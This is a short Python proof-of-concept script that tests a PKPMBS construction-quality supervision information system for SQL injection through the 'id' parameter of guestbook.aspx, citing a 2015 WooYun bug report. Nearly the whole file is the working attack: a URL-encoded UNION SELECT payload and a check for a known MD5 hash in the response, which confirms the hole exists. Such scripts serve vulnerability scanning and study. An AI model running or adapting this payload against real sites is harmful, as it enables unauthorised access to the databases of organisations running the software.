#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PKPMBS工程质量监督站信息管理系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0154499
author: Lucifer
description: PKPMBS guestbook.aspx文件中参数id存在SQL注入漏洞
'''
import sys
import requests
import warnings
from termcolor import cprint

class pkpmbs_guestbook_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/guestbook.aspx?do=show&id=1%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null,null,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在PKPMBS SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = pkpmbs_guestbook_sqli_BaseVerify(sys.argv[1])
    testVuln.run()